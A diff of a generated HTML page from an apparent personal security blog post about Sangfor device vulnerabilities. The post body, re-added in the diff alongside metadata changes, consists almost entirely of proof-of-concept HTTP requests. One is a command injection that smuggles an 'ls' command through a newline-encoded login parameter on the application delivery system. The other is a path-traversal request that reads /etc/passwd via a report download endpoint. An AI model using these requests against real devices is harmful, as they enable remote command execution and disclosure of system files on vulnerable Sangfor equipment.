@@ -16,15 +16,15 @@
   <meta name="author" content="3xsh0re">
   <meta name="keywords" content="">
   
-    <meta name="description" content="深信服应用交付系统命令执行漏洞POC1234POST &#x2F;rep&#x2F;login HTTP&#x2F;1.1Host:10.10.10.1:85clsMode&#x3D;cls_mode_login%0Als%0A&amp;index&#x3D;index&amp;log_type&#x3D;report&amp;loginType&#x3D;account&amp;page&#x3D;login&amp;rnd&#x3D;0&amp;userID&#x3D;admin&amp;u">
+    <meta name="description" content="深信服应用交付系统命令执行漏洞POC1234POST &#x2F;rep&#x2F;login HTTP&#x2F;1.1Host:10.10.10.1:85clsMode&#x3D;cls_mode_login%0Als%0A&amp;index&#x3D;index&amp;log_type&#x3D;report&amp;loginType&#x3D;account&amp;page&#x3D;login&amp;rnd&#x3D;0&amp;userID&#x3D;admin&amp;amp">
 <meta property="og:type" content="article">
 <meta property="og:title" content="深信服设备漏洞">
 <meta property="og:url" content="https://remixxyh.github.io/2023/08/12/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="3xsh0re">
-<meta property="og:description" content="深信服应用交付系统命令执行漏洞POC1234POST &#x2F;rep&#x2F;login HTTP&#x2F;1.1Host:10.10.10.1:85clsMode&#x3D;cls_mode_login%0Als%0A&amp;index&#x3D;index&amp;log_type&#x3D;report&amp;loginType&#x3D;account&amp;page&#x3D;login&amp;rnd&#x3D;0&amp;userID&#x3D;admin&amp;u">
+<meta property="og:description" content="深信服应用交付系统命令执行漏洞POC1234POST &#x2F;rep&#x2F;login HTTP&#x2F;1.1Host:10.10.10.1:85clsMode&#x3D;cls_mode_login%0Als%0A&amp;index&#x3D;index&amp;log_type&#x3D;report&amp;loginType&#x3D;account&amp;page&#x3D;login&amp;rnd&#x3D;0&amp;userID&#x3D;admin&amp;amp">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-08-12T03:59:32.000Z">
-<meta property="article:modified_time" content="2023-08-12T02:18:50.679Z">
+<meta property="article:modified_time" content="2023-08-31T15:13:41.480Z">
 <meta property="article:author" content="3xsh0re">
 <meta property="article:tag" content="POC">
 <meta property="article:tag" content="深信服">
@@ -311,7 +311,9 @@
             
               <div class="markdown-body">
                 
-                <h3 id="深信服应用交付系统命令执行漏洞"><a href="#深信服应用交付系统命令执行漏洞" class="headerlink" title="深信服应用交付系统命令执行漏洞"></a>深信服应用交付系统命令执行漏洞</h3><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/rep/login</span> <span class="hljs-meta">HTTP/1.1</span><br>Host:10.10.10.1:85<br><br><span class="language-sas">clsMode=cls_mode_login%0Als%0A<span class="hljs-variable">&amp;index</span>=<span class="hljs-keyword">index</span><span class="hljs-variable">&amp;log_type</span>=report<span class="hljs-variable">&amp;loginType</span>=account<span class="hljs-variable">&amp;page</span>=login<span class="hljs-variable">&amp;rnd</span>=0<span class="hljs-variable">&amp;userID</span>=admin<span class="hljs-variable">&amp;userPsw</span>=123</span><br></code></pre></td></tr></table></figure>
+                <span id="more"></span>
+
+<h3 id="深信服应用交付系统命令执行漏洞"><a href="#深信服应用交付系统命令执行漏洞" class="headerlink" title="深信服应用交付系统命令执行漏洞"></a>深信服应用交付系统命令执行漏洞</h3><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/rep/login</span> <span class="hljs-meta">HTTP/1.1</span><br>Host:10.10.10.1:85<br><br><span class="language-sas">clsMode=cls_mode_login%0Als%0A<span class="hljs-variable">&amp;index</span>=<span class="hljs-keyword">index</span><span class="hljs-variable">&amp;log_type</span>=report<span class="hljs-variable">&amp;loginType</span>=account<span class="hljs-variable">&amp;page</span>=login<span class="hljs-variable">&amp;rnd</span>=0<span class="hljs-variable">&amp;userID</span>=admin<span class="hljs-variable">&amp;userPsw</span>=123</span><br></code></pre></td></tr></table></figure>
 
 <h3 id="深信服报表任意读取"><a href="#深信服报表任意读取" class="headerlink" title="深信服报表任意读取"></a>深信服报表任意读取</h3><p>版本有限制</p>
 <h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http">GET/report/download.php?pdf=../../../../../etc/passwd HTTP/1.1<br>Host:xx.xx.xx.xx:85<br>User-Agent:Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)<br>Accept:*/*<br>Connection:Keep-Alive<br></code></pre></td></tr></table></figure>
